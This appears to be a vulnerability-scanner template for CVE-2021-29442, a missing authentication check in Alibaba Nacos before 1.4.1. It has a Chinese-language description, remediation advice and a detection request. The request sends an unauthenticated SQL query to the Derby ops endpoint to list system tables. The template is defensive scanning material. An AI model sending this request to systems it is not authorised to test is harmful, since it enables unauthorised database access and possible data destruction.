id: CVE-2021-29442
info:
  name: Nacos prior to 1.4.1 Missing Authentication Check
  author:
  - l0ne1y
  description: |-
    Alibaba nacos 访问控制错误漏洞
    nacos是中国阿里巴巴（Alibaba）的一个动态服务发现、配置和服务管理平台。该软件支持基于 DNS 和基于 RPC 的服务发现，可提供提供实时健康检查，阻止服务向不健康的主机或服务实例发送请求等功能。

    Nacos 存在访问控制错误漏洞，该漏洞源于ConfigOpsController允许用户执行管理操作，比如查询数据库，甚至清除数据库。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/advisories/GHSA-36hp-jr8h-556f

    临时修复方案：
    1、调用功能前验证用户是否有权限调用相关功能。
    2、对功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控制。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/json
  - type: regex
    part: body
    regex:
    - '"TABLENAME":"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)"'
  matchers-condition: and
  path:
  - '{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st'
  method: GET
